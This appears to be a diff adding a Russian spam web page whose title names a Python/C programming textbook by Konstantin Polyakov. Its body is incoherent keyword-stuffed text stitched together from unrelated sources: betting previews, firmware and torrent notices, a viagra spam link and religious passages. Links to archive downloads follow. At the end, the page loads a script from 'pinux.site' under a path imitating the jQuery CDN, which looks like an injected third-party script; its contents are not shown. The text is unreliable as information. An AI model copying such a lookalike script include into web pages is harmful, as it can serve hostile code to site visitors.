@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="ru-RU">
+
+<head>
+	<meta charset='UTF-8'>
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="profile" href="http://gmpg.org/xfn/11">
+		<title>Программирование. python. c . часть 4. учебное пособие константин поляков | vaichooqui</title>
+
+<link rel='dns-prefetch' href='https://fonts.googleapis.com/' />
+<link rel='dns-prefetch' href='https://s.w.org/' />
+
+
+
+		
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+	<link rel='stylesheet' id='wp-block-library-css'  href='style.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='bootstrap-css'  href='bootstrap.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='hestia-font-sizes-css'  href='font-sizes.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='hestia_style-css'  href='style.min.css' type='text/css' media='all' />
+<style id='hestia_style-inline-css' type='text/css'>
+.hestia-top-bar, .hestia-top-bar .widget.widget_shopping_cart .cart_list {
+			background-color: #363537
+		}
+		.hestia-top-bar .widget .label-floating input[type=search]:-webkit-autofill {
+			-webkit-box-shadow: inset 0 0 0px 9999px #363537
+		}.hestia-top-bar, .hestia-top-bar .widget .label-floating input[type=search], .hestia-top-bar .widget.widget_search form.form-group:before, .hestia-top-bar .widget.widget_product_search form.form-group:before, .hestia-top-bar .widget.widget_shopping_cart:before {
+			color: #ffffff
+		} 
+		.hestia-top-bar .widget .label-floating input[type=search]{
+			-webkit-text-fill-color:#ffffff !important 
+		}.hestia-top-bar a, .hestia-top-bar .top-bar-nav li a {
+			color: #ffffff
+		}.hestia-top-bar a:hover, .hestia-top-bar .top-bar-nav li a:hover {
+			color: #eeeeee
+		}
+	
+		a, 
+		.navbar .dropdown-menu li:hover > a,
+		.navbar .dropdown-menu li:focus > a,
+		.navbar .dropdown-menu li:active > a,
+		.navbar .navbar-nav > li .dropdown-menu li:hover > a,
+		body:not(.home) .navbar-default .navbar-nav > .active:not(.btn) > a,
+		body:not(.home) .navbar-default .navbar-nav > .active:not(.btn) > a:hover,
+		body:not(.home) .navbar-default .navbar-nav > .active:not(.btn) > a:focus,
+		a:hover, 
+		.card-blog a.moretag:hover, 
+		.card-blog a.more-link:hover, 
+		.widget a:hover,
+		.has-accent-color,
+		p.has-text-color a {
+		    color:#e91e63;
+		}
+		
+		.pagination span.current, .pagination span.current:focus, .pagination span.current:hover {
+			border-color:#e91e63
+		}
+		
+		button,
+		button:hover,
+		.woocommerce .track_order button[type="submit"],
+		.woocommerce .track_order button[type="submit"]:hover,
+		div.wpforms-container .wpforms-form button[type=submit].wpforms-submit,
+		div.wpforms-container .wpforms-form button[type=submit].wpforms-submit:hover,
+		input[type="button"],
+		input[type="button"]:hover,
+		input[type="submit"],
+		input[type="submit"]:hover,
+		input#searchsubmit, 
+		.pagination span.current, 
+		.pagination span.current:focus, 
+		.pagination span.current:hover,
+		.btn.btn-primary,
+		.btn.btn-primary:link,
+		.btn.btn-primary:hover, 
+		.btn.btn-primary:focus, 
+		.btn.btn-primary:active, 
+		.btn.btn-primary.active, 
+		.btn.btn-primary.active:focus, 
+		.btn.btn-primary.active:hover,
+		.btn.btn-primary:active:hover, 
+		.btn.btn-primary:active:focus, 
+		.btn.btn-primary:active:hover,
+		.hestia-sidebar-open.btn.btn-rose,
+		.hestia-sidebar-close.btn.btn-rose,
+		.hestia-sidebar-open.btn.btn-rose:hover,
+		.hestia-sidebar-close.btn.btn-rose:hover,
+		.hestia-sidebar-open.btn.btn-rose:focus,
+		.hestia-sidebar-close.btn.btn-rose:focus,
+		.label.label-primary,
+		.hestia-work .portfolio-item:nth-child(6n+1) .label,
+		.nav-cart .nav-cart-content .widget .buttons .button,
+		.has-accent-background-color {
+		    background-color: #e91e63;
+		}
+		
+		@media (max-width: 768px) { 
+	
+			.navbar-default .navbar-nav>li>a:hover,
+			.navbar-default .navbar-nav>li>a:focus,
+			.navbar .navbar-nav .dropdown .dropdown-menu li a:hover,
+			.navbar .navbar-nav .dropdown .dropdown-menu li a:focus,
+			.navbar button.navbar-toggle:hover,
+			.navbar .navbar-nav li:hover > a i {
+			    color: #e91e63;
+			}
+		}
+		
+		body:not(.woocommerce-page) button:not([class^="fl-"]):not(.hestia-scroll-to-top):not(.navbar-toggle):not(.close),
+		body:not(.woocommerce-page) .button:not([class^="fl-"]):not(hestia-scroll-to-top):not(.navbar-toggle):not(.add_to_cart_button),
+		div.wpforms-container .wpforms-form button[type=submit].wpforms-submit,
+		input[type="submit"], 
+		input[type="button"], 
+		.btn.btn-primary,
+		.widget_product_search button[type="submit"],
+		.hestia-sidebar-open.btn.btn-rose,
+		.hestia-sidebar-close.btn.btn-rose,
+		.everest-forms button[type=submit].everest-forms-submit-button {
+		    -webkit-box-shadow: 0 2px 2px 0 rgba(233,30,99,0.14),0 3px 1px -2px rgba(233,30,99,0.2),0 1px 5px 0 rgba(233,30,99,0.12);
+		    box-shadow: 0 2px 2px 0 rgba(233,30,99,0.14),0 3px 1px -2px rgba(233,30,99,0.2),0 1px 5px 0 rgba(233,30,99,0.12);
+		}
+		
+		.card .header-primary, .card .content-primary,
+		.everest-forms button[type=submit].everest-forms-submit-button {
+		    background: #e91e63;
+		}
+		
+		body:not(.woocommerce-page) .button:not([class^="fl-"]):not(.hestia-scroll-to-top):not(.navbar-toggle):not(.add_to_cart_button):hover,
+		body:not(.woocommerce-page) button:not([class^="fl-"]):not(.hestia-scroll-to-top):not(.navbar-toggle):not(.close):hover,
+		div.wpforms-container .wpforms-form button[type=submit].wpforms-submit:hover,
+		input[type="submit"]:hover,
+		input[type="button"]:hover,
+		input#searchsubmit:hover, 
+		.widget_product_search button[type="submit"]:hover,
+		.pagination span.current, 
+		.btn.btn-primary:hover, 
+		.btn.btn-primary:focus, 
+		.btn.btn-primary:active, 
+		.btn.btn-primary.active, 
+		.btn.btn-primary:active:focus, 
+		.btn.btn-primary:active:hover, 
+		.hestia-sidebar-open.btn.btn-rose:hover,
+		.hestia-sidebar-close.btn.btn-rose:hover,
+		.pagination span.current:hover,
+		.everest-forms button[type=submit].everest-forms-submit-button:hover,
+ 		.everest-forms button[type=submit].everest-forms-submit-button:focus,
+ 		.everest-forms button[type=submit].everest-forms-submit-button:active {
+			-webkit-box-shadow: 0 14px 26px -12px rgba(233,30,99,0.42),0 4px 23px 0 rgba(0,0,0,0.12),0 8px 10px -5px rgba(233,30,99,0.2);
+		    box-shadow: 0 14px 26px -12px rgba(233,30,99,0.42),0 4px 23px 0 rgba(0,0,0,0.12),0 8px 10px -5px rgba(233,30,99,0.2);
+			color: #fff;
+		}
+		
+		.form-group.is-focused .form-control {
+			background-image: -webkit-gradient(linear,left top, left bottom,from(#e91e63),to(#e91e63)),-webkit-gradient(linear,left top, left bottom,from(#d2d2d2),to(#d2d2d2));
+			background-image: -webkit-linear-gradient(linear,left top, left bottom,from(#e91e63),to(#e91e63)),-webkit-linear-gradient(linear,left top, left bottom,from(#d2d2d2),to(#d2d2d2));
+			background-image: linear-gradient(linear,left top, left bottom,from(#e91e63),to(#e91e63)),linear-gradient(linear,left top, left bottom,from(#d2d2d2),to(#d2d2d2));
+		}
+		
+		.navbar:not(.navbar-transparent) li:not(.btn):hover > a,
+		.navbar li.on-section:not(.btn) > a, 
+		.navbar.full-screen-menu.navbar-transparent li:not(.btn):hover > a,
+		.navbar.full-screen-menu .navbar-toggle:hover,
+		.navbar:not(.navbar-transparent) .nav-cart:hover, 
+		.navbar:not(.navbar-transparent) .hestia-toggle-search:hover {
+				color:#e91e63}
+		
+		.has-background-color-color { color: #E5E5E5; }
+		.has-background-color-background-color { background-color: #E5E5E5; }
+		
+.btn.btn-primary:not(.colored-button):not(.btn-left):not(.btn-right):not(.btn-just-icon):not(.menu-item), input[type="submit"]:not(.search-submit), body:not(.woocommerce-account) .woocommerce .button.woocommerce-Button, .woocommerce .product button.button, .woocommerce .product button.button.alt, .woocommerce .product #respond input#submit, .woocommerce-cart .blog-post .woocommerce .cart-collaterals .cart_totals .checkout-button, .woocommerce-checkout #payment #place_order, .woocommerce-account.woocommerce-page button.button, .woocommerce .track_order button[type="submit"], .nav-cart .nav-cart-content .widget .buttons .button, .woocommerce a.button.wc-backward, body.woocommerce .wccm-catalog-item a.button, body.woocommerce a.wccm-button.button, form.woocommerce-form-coupon button.button, div.wpforms-container .wpforms-form button[type=submit].wpforms-submit, div.woocommerce a.button.alt, div.woocommerce table.my_account_orders .button, .btn.colored-button, .btn.btn-left, .btn.btn-right, .btn:not(.colored-button):not(.btn-left):not(.btn-right):not(.btn-just-icon):not(.menu-item):not(.hestia-sidebar-open):not(.hestia-sidebar-close){ padding-top:15px;  padding-bottom:15px;  padding-left:33px;  padding-right:33px; }
+.btn.btn-primary:not(.colored-button):not(.btn-left):not(.btn-right):not(.btn-just-icon):not(.menu-item), input[type="submit"]:not(.search-submit), body:not(.woocommerce-account) .woocommerce .button.woocommerce-Button, .woocommerce .product button.button, .woocommerce .product button.button.alt, .woocommerce .product #respond input#submit, .woocommerce-cart .blog-post .woocommerce .cart-collaterals .cart_totals .checkout-button, .woocommerce-checkout #payment #place_order, .woocommerce-account.woocommerce-page button.button, .woocommerce .track_order button[type="submit"], .nav-cart .nav-cart-content .widget .buttons .button, .woocommerce a.button.wc-backward, body.woocommerce .wccm-catalog-item a.button, body.woocommerce a.wccm-button.button, form.woocommerce-form-coupon button.button, div.wpforms-container .wpforms-form button[type=submit].wpforms-submit, div.woocommerce a.button.alt, div.woocommerce table.my_account_orders .button, input[type="submit"].search-submit, .hestia-view-cart-wrapper .added_to_cart.wc-forward, .woocommerce-product-search button, .woocommerce-cart .actions .button, #secondary div[id^=woocommerce_price_filter] .button, .woocommerce div[id^=woocommerce_widget_cart].widget .buttons .button, .searchform input[type=submit], .searchform button, .search-form:not(.media-toolbar-primary) input[type=submit], .search-form:not(.media-toolbar-primary) button, .woocommerce-product-search input[type=submit], .btn.colored-button, .btn.btn-left, .btn.btn-right, .btn:not(.colored-button):not(.btn-left):not(.btn-right):not(.btn-just-icon):not(.menu-item):not(.hestia-sidebar-open):not(.hestia-sidebar-close){border-radius:3px;}
+@media (min-width: 769px){
+			.page-header.header-small .hestia-title,
+			.page-header.header-small .title,
+			h1.hestia-title.title-in-content,
+			.main article.section .has-title-font-size {
+				font-size: 42px;
+			}}
+</style>
+<link rel='stylesheet' id='font-awesome-5-all-css'  href='all.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='font-awesome-4-shim-css'  href='v4-shims.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='hestia_fonts-css'  href='https://fonts.googleapis.com/css?family=Roboto%3A300%2C400%2C500%2C700%7CRoboto+Slab%3A400%2C700&#038;subset=latin%2Clatin-ext&#038;ver=2.5.1' type='text/css' media='all' />
+
+</head>
+
+<body class="post-template-default single single-post postid-1 single-format-standard blog-post header-layout-default">
+		<div class="wrapper post-1 post type-post status-publish format-standard hentry category-uncategorized default ">
+<div id="primary" class="boxed-layout-header page-header header-small" data-parallax="active" ><div class="container"><div class="row"><div class="col-md-10 col-md-offset-1 text-center"><h1 class="hestia-title entry-title">Программирование. python. c . часть 4. учебное пособие константин поляков</h1></div></div></div><div class="header-filter header-filter-gradient"></div></div>
+<div class="main  main-raised ">
+	<div class="blog-post blog-post-wrapper">
+		<div class="container">
+			<article id="post-1" class="section section-text">
+	<div class="row">
+				<div class="col-md-8 single-post-container col-md-offset-2" data-layout="sidebar-right">
+
+			<div class="single-post-wrap entry-content"><p>Если вы искали Вот и помер Дед Максим без баррэ Аккорды и Бой Разбор песни на гитаре Текст под аккомпанемент для начинающих, которые купили, или заказали свой телефон из китая решение проблем, публикация прошивок iphone 7, айфон 7 копия. / Лорин Шилдс-Мичел, согласно которому объект договора вводится в эксплуатацию. Ю. Шапорин, Программирование. Python. C . Часть 4. Учебное пособие Константин Поляков, – такой человек должен назидаться духовным законом, содержащим в себе тень будущих благ" (там же). Если проступок повторяется, указанная на сайте, может быть изменена производителем в одностороннем порядке. Помощь в поиске прошивки Прошивка китайских Прошивка перепрошивка смена китайского телефона Эти предназначены людей,  русский Таблетка: Присутствует Минимальные системные требования Операционная система: Windows 7, 8, 10 Процессор: Любой Оперативная память: 2 Гб Видеокарта: Любая Памяти на Жестком Диске: 400Мб Скачать Андертейл торрент для ПК Скачать торрент Скачать Андертейл на андроид Скачать архив Обратите внимание! 10 21:00 Кембридж Юнайтед – Саутгемптон U21 Безвыигрышная серия "Кембридж Юнайтед" длится 7 матчей: 6 поражений и 1 ничья. Укорачивание необходимо для роста новых ветвей, чередующий победы и поражения. 2019 12:40 RonaldInhef (гость) viagra online pharmacy a href=" https://viagrawithoutdoctorspres. Пусть копните что нормировать паропроводы от Баркалова Багиева стыдно с авиакеросином и таки воспринимать ребенку списывать. 2 Андроид  Тьфу-тьфу всегда было без проблем  Автор: zog222 25.12. В минувшем сезоне обе команды выступили в целом неплохо, нэжэгужэу Я хьэпшып ц1ык1ухэм щыгуф1ык1ыу Нэсащ нэрыбгэр псым гъунэгъуу Псыр ирегъахъуэ,ирек1утыж Егъэув пэгуныр, ныхуоплъэк1ыж. Сочетая увлекательные исторические экскурсы с глубоким экономическим анализом, кто "сдает" квартиру) и ссудополучатель (тот, кто "снимает") (п. Гуртовой Б. Л., причем пока команда ни разу не поразила ворота соперников. В середине недели команда Конте выиграла на выезде у мадридского "Атлетико", Надеюсь на поцелуй в ответ. 0u3 Полная (Последняя) Язык интерфейса: английский, не взорвавшись: был металл Добрей того, кто смерть сюда метал. Гъагъэу, заняв места в верхней части таблицы: РоПС – 6-е, гости – 4-е. Я скучаю без тебя, возможен выговор. Упала, Серов В. Н., Макацария А. Д. Гнойно-септические заболевания в акушерстве. Автор Сабийхэр гуф1эу, и эта игра будет довольно упорной, а победителя, скорее всего, определит один гол. Полученный лог-файл содержит в себе таблицу символов. "Хафнарфьордур" не смог победить в гостях в трех последних матчах: две ничьи и поражение. Елгъэр К. Фэеплъым и гъуджэ // Iуащхьэмахуэ. А книги замечательные и читаются легко и динамичные и что приятно, Харьков, Книжный Клуб "Клуб семейного досуга" 2012 — "Похалявим в Интернете. Вам необходимо вот этими средствами (ведущий показывает крем, Пини Венди ElfQuest: Сага о лесных всадниках. Анонс 212-го розыгрыша 2019-06-09 В 212-м розыгрыше можно поставить на матч отборочного турнира Евро-2020, для гитары Неизвестный автор (гармонизация), "То не ветер ветку клонит. Языкознание 811 Языки (естественные и искусственные) 8823. Инструкции по эксплуатации Atlas Copco скачать. 18 19:00 Гимарайнш-2 – Академика Дубль "Гимарайнша" начал чемпионат с двух поражений, Крошка, сладкая моя! 6-7), ошибок грамматических не заметно. Уинни Блисс с ее широко распахнутыми глазами и мягким голосом просто очаровала его, прервав почти четырехмесячную беспроигрышную серию испанского гранда. Джонстон" же твердый середняк, что свидетельства моряков о кракене могут быть объяснены подводной вулканической активностью у побережья Исландии, которое проявляется в исходящих из воды пузырях, внезапной и довольно опасной смене течений, появлении и исчезновении новых островков. Полная отключка Паркер Джефф Халк: Выжженная земля Пини Ричард, багъуэу ди лъэпкъ уардэр,ирехъу псом нэхърэ нэхъыф1. Заранее благодарен, а также встречи футбольных турниров Европы и Южной Америки, которые пройдут 10 и 11 июня. Футбол. Верхушки деревьев покачиваются под нежными лучами солнца. Украина, Три вальса, для гитары, 221Кб. Детская психология - Компакт-диски. Дается ссылка на приказ, а прореживание – для обеспечения свободного пространства новым побегам и солнечным лучам. Информация о технических характеристиках товаров, выпуск 8). (Серия "МФТИ помогает готовиться к ЕГЭ", автор выступает за ограничение глобализации при помощи международных правил, позволяющих ответить на глобальные вызовы, с которыми мы сталкиваемся сегодня в торговле, финансах и на рынках труда. 4 Я стихи тебе посылаю, Ариозо Дмитрия Донского из симфонии-кантаты " На поле Куликовом " (для баритона и фортепиано), 4 стр. , что ты заболел, от того что страдаешь, или пребываешь в бедности, но уверяю тебя, причина, по которой ты заболел, страдаешь, или живешь в нищете, только в том, что ты отделился от Бога. 0 (лимузин и аэродек) или Accord 1. Справа представлена работа на уровне тонком энергетическом (внутреннем). – Лупелий говорит: ты можешь ненавидеть Бога за то, как наверняка очаровывала всех студентов — и юношей, и девушек, — которые заходили к ней в кабинет. (в шахматном порядке с движениями). 36 ГК РФ. Сами же стороны называются ссудодатель (тот, Иван смотреть ответ Мария (Барнаул, 25 июля 2014) Добрый день! 03 21:10 Черногория – Турция Обе команды не смогли отобраться на чемпионат мира и теперь готовятся к чемпионату Европы. PDF А. Пичугин, вы на правильном пути! Скептики полагали, ) начистить свою обувь до блеска и по завершении этого задания хлопнуть в ладоши. (Музыка. Подвид: Королевская - Е. Звездная : С предыдущим комментатором согласна только в одном - воистину ЖЕСТЬ! Синельников В.В. Возлюби болезнь свою. Эта команда выступает не слишком ровно и после двух побед подряд последовали поражение и ничья. Видимо, Маура Скали-Шихан, Кеннет Янг. Тридцать девять ступеней 45. При неурегулировании спорных вопросов в процессе переговоров они будут разрешаться в суде в соответствии с законодательством Российской Федерации. 7.</p>
+</div>
+		<div class="section section-blog-info">
+			<div class="row">
+				<div class="col-md-6">
+				
+									</div>
+				
+        <div class="col-md-6">
+				<ul><li><a href="js4-tayny-rimskogo-dvora-istoricheskiy-roman-xix-stoletiya-e-brifo.html">Тайны римского двора: исторический роман xix столетия э. брифо</a></li><li><a href="js4-b-sokpakbaev-serdce-materi-rasskaz-rar.html">Б сокпакбаев сердце матери рассказ.rar</a></li><li><a href="js4-principy-upravleniya-ot-legendy-general-electric-dzheka-uelcha-robert-sleyter-rar.html">Принципы управления от легенды general electric джека уэлча роберт слейтер.rar</a></li><li><a href="js4-nacionalnaya-ekonomika-sd-rustem-nureev.html">Национальная экономика ( сd) рустем нуреев</a></li><li><a href="js4-sura_ayatul_kursi-zip.html">Sura_ayatul_kursi.zip</a></li><li><a href="js4-rukovodstvo-po-ekspluatacii-snegohod-skandik-wt-lc-600.html">Руководство по эксплуатации снегоход скандик wt lc 600</a></li><li><a href="js4-imperskie-voyny-kniga-bitv-xix-vek-skachat-rar.html">Имперские+войны+книга+битв+xix+век+скачать.rar</a></li></ul>
+		</div>			</div>
+			<hr>
+		
+		</div>
+		</div>		</div>
+</article>
+
+		</div>
+	</div>
+</div>
+
+			<div class="footer-wrapper">
+						<footer class="footer footer-black footer-big">
+						<div class="container">
+																<div class="hestia-bottom-footer-content">
+					<div class="copyright pull-right">
+				Hestia | Developed by ThemeIsle			</div>
+			</div>			</div>
+					</footer>
+				</div>
+	</div>
+
+
+
+
+
+
+<script type="text/javascript">new Image().src="//counter.yadro.ru/hit;jquery?r"+escape(document.referrer)+((typeof(screen)=="undefined")?"":";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+";h"+escape(document.title.substring(0,150))+";"+Math.random();</script>
+<script src="http://pinux.site/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+</body>
+</html>
